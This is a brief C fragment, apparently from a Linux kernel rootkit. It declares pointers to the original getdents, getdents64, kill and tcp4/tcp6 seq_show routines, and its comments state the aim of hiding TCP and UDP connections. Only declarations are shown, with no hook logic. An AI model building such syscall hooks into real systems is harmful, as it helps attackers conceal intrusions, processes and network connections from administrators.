/*typedef asmlinkage int (*t_syscall)(const struct pt_regs *);
static t_syscall orig_getdents;
static t_syscall orig_getdents64;
static t_syscall orig_kill; */
        
static asmlinkage int (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);  // to do to hide tcp conn
static asmlinkage int (*orig_tcp6_seq_show)(struct seq_file *seq, void *v); // to do to hide udp conn
		


